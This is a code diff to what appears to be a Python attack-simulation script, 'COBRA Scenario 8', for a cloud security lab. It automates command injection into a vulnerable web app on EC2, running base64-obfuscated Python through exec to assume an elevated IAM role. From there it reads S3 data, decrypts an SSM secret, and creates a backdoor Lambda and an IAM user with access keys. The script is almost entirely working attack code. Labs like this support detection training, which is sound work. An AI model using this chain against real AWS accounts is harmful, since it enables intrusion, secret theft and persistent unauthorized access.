@@ -1,6 +1,6 @@
 """
-COBRA Scenario 8: Vulnerable web app (command injection) -> EC2 RCE -> S3, SSM, Lambda persistence.
-Two EC2s: victim (vulnerable app + IAM role), attacker (runs exploit via curl to victim).
+COBRA Scenario 8: Vulnerable web app (command injection) -> EC2 RCE -> AssumeRole privilege escalation -> S3, SSM, Lambda -> persistence.
+Two EC2s: web server (vulnerable app + IAM role with AssumeRole only), attacker (runs exploit via curl to web server).
 """
 import base64
 import json
@@ -15,10 +15,10 @@ from tqdm import tqdm
 from core.helpers import generate_ssh_key, loading_animation
 
 
-def _run_via_attacker(attacker_ip, victim_ip, cmd, key_path="./id_rsa"):
-    """Run a command on the victim by SSH to attacker and curling the vulnerable app."""
+def _run_via_attacker(attacker_ip, web_server_ip, cmd, key_path="./id_rsa"):
+    """Run a command on the web server by SSH to attacker and curling the vulnerable app."""
     encoded = quote(cmd, safe="")
-    url = f"http://{victim_ip}:8000/?cmd={encoded}"
+    url = f"http://{web_server_ip}:8000/?cmd={encoded}"
     ssh_cmd = (
         f'ssh -o StrictHostKeyChecking=accept-new -i {key_path} ubuntu@{attacker_ip} '
         f'"curl -s \\"{url}\\""'
@@ -35,7 +35,7 @@ def _run_via_attacker(attacker_ip, victim_ip, cmd, key_path="./id_rsa"):
 def scenario_8_execute(manual=False):
     print("-" * 30)
     print(colored(
-        "Executing Scenario 8: Vulnerable web app (command injection) -> EC2 RCE -> S3, SSM, Lambda persistence",
+        "Executing Scenario 8: Vulnerable web app (command injection) -> EC2 RCE -> AssumeRole privilege escalation -> S3, SSM, Lambda -> persistence",
         color="red",
     ))
     loading_animation()
@@ -85,7 +85,7 @@ def scenario_8_execute(manual=False):
         print(colored(f"Invalid JSON in output file: {e}. Check that 'pulumi stack output --json' runs correctly.", color="red"))
         raise SystemExit(1) from e
 
-    victim_ip = data["Web Server Public IP"]
+    web_server_ip = data["Web Server Public IP"]
     attacker_ip = data["Attacker Server Public IP"]
     bucket_name = data["Bucket Name"]
     bucket_key = data["Bucket Key"]
@@ -106,84 +106,26 @@ def scenario_8_execute(manual=False):
     if manual:
         print(colored("Lab ready. SSH to attacker and run exploit manually.", color="green"))
         print(colored(f"  ssh -i ./id_rsa ubuntu@{attacker_ip}", color="cyan"))
-        print(colored(f"  curl \"http://{victim_ip}:8000/?cmd=id\"", color="cyan"))
+        print(colored(f"  curl \"http://{web_server_ip}:8000/?cmd=id\"", color="cyan"))
         return
 
-    # --- Attack steps (from attacker EC2, curling victim app) ---
+    # --- Attack steps: RCE then AssumeRole -> S3, SSM, Lambda, IAM user (all with elevated role) ---
     print("-" * 30)
-    print(colored("RCE check: run id on victim", color="red"))
+    print(colored("RCE check: run id on web server", color="red"))
     loading_animation()
-    rce_out = _run_via_attacker(attacker_ip, victim_ip, "id")
+    rce_out = _run_via_attacker(attacker_ip, web_server_ip, "id")
     print(colored(f"  Output: {rce_out[:200]}", color="green"))
 
     print("-" * 30)
-    print(colored("List S3 buckets (using victim instance role)", color="red"))
-    loading_animation()
-    list_cmd = (
-        "python3 -c \"import boto3,json; "
-        "b=boto3.client('s3').list_buckets()['Buckets']; "
-        "print(json.dumps([x['Name'] for x in b]))\""
-    )
-    list_out = _run_via_attacker(attacker_ip, victim_ip, list_cmd)
-    print(colored(f"  Buckets: {list_out[:300]}", color="green"))
-
-    print("-" * 30)
-    print(colored("Read S3 object (sensitive data)", color="red"))
-    loading_animation()
-    read_cmd = (
-        f"python3 -c \"import boto3; "
-        f"c=boto3.client('s3'); "
-        f"r=c.get_object(Bucket='{bucket_name}', Key='{bucket_key}'); "
-        f"print(r['Body'].read().decode())\""
-    )
-    read_out = _run_via_attacker(attacker_ip, victim_ip, read_cmd)
-    print(colored(f"  Content: {read_out[:200]}", color="green"))
-
-    print("-" * 30)
-    print(colored("Retrieve SSM Parameter Store secret", color="red"))
-    loading_animation()
-    ssm_cmd = (
-        f"python3 -c \"import boto3; "
-        f"c=boto3.client('ssm', region_name='{region}'); "
-        f"r=c.get_parameter(Name='{ssm_name}', WithDecryption=True); "
-        f"print(r[\\\"Parameter\\\"][\\\"Value\\\"])\""
-    )
-    ssm_out = _run_via_attacker(attacker_ip, victim_ip, ssm_cmd)
-    print(colored(f"  Secret: {ssm_out[:100]}", color="green"))
-
-    print("-" * 30)
-    print(colored("Create Lambda function for persistence", color="red"))
-    loading_animation()
-    # Inline script that creates a minimal Lambda (run on victim via exec(base64.decode))
-    lambda_script = f"""
-import boto3, zipfile, io
-code = b'def handler(event, context): return {{"statusCode": 200}}'
-buf = io.BytesIO()
-with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
-    z.writestr('index.py', code.decode())
-buf.seek(0)
-boto3.client('lambda', region_name='{region}').create_function(
-    FunctionName='cobra-s8-backdoor',
-    Runtime='python3.11',
-    Role='{lambda_role_arn}',
-    Handler='index.handler',
-    Code={{'ZipFile': buf.read()}}
-)
-print('Lambda created')
-"""
-    lambda_b64 = base64.b64encode(lambda_script.strip().encode()).decode()
-    lambda_cmd = f"python3 -c \"import base64; exec(base64.b64decode('{lambda_b64}').decode())\""
-    lambda_out = _run_via_attacker(attacker_ip, victim_ip, lambda_cmd)
-    print(colored(f"  Result: {lambda_out[:150]}", color="green"))
-
-    # --- Privilege escalation: AssumeRole from victim EC2, then sensitive data + persistence ---
-    print("-" * 30)
-    print(colored("AssumeRole (privilege escalation from victim EC2)", color="red"))
+    print(colored("AssumeRole (privilege escalation from web server EC2) -> S3, SSM, Lambda, IAM user", color="red"))
     loading_animation()
     escalation_script = f"""
-import boto3
+import boto3, zipfile, io
 role_arn = '{elevated_role_arn}'
+bucket_name = '{bucket_name}'
+bucket_key = '{bucket_key}'
 ssm_name = '{ssm_name}'
+lambda_role_arn = '{lambda_role_arn}'
 region = '{region}'
 sts = boto3.client('sts')
 resp = sts.assume_role(RoleArn=role_arn, RoleSessionName='cobra-s8-escalation')
@@ -194,9 +136,27 @@ session = boto3.Session(
     aws_session_token=creds['SessionToken'],
 )
 print('AssumeRole: success')
+s3 = session.client('s3')
+buckets = s3.list_buckets()['Buckets']
+print('Buckets:', [x['Name'] for x in buckets])
+r = s3.get_object(Bucket=bucket_name, Key=bucket_key)
+print('S3 content:', r['Body'].read().decode()[:200])
 ssm = session.client('ssm', region_name=region)
 p = ssm.get_parameter(Name=ssm_name, WithDecryption=True)
-print('Secret (assumed role):', p['Parameter']['Value'])
+print('Secret:', p['Parameter']['Value'])
+code = b'def handler(event, context): return {{"statusCode": 200}}'
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr('index.py', code.decode())
+buf.seek(0)
+session.client('lambda', region_name=region).create_function(
+    FunctionName='cobra-s8-backdoor',
+    Runtime='python3.11',
+    Role=lambda_role_arn,
+    Handler='index.handler',
+    Code={{'ZipFile': buf.read()}}
+)
+print('Lambda created')
 iam = session.client('iam')
 try:
     iam.create_user(UserName='cobra-s8-persist')
@@ -207,10 +167,10 @@ print('IAM user created, KeyId:', ak['AccessKey']['AccessKeyId'])
 """
     esc_b64 = base64.b64encode(escalation_script.strip().encode()).decode()
     esc_cmd = f"python3 -c \"import base64; exec(base64.b64decode('{esc_b64}').decode())\""
-    esc_out = _run_via_attacker(attacker_ip, victim_ip, esc_cmd)
-    for line in esc_out.split("\n")[:5]:
+    esc_out = _run_via_attacker(attacker_ip, web_server_ip, esc_cmd)
+    for line in esc_out.split("\n"):
         if line.strip():
-            print(colored(f"  {line.strip()}", color="green"))
+            print(colored(f"  {line.strip()[:300]}", color="green"))
 
     print("-" * 30)
     print(colored("Scenario 8 executed successfully!", color="green"))
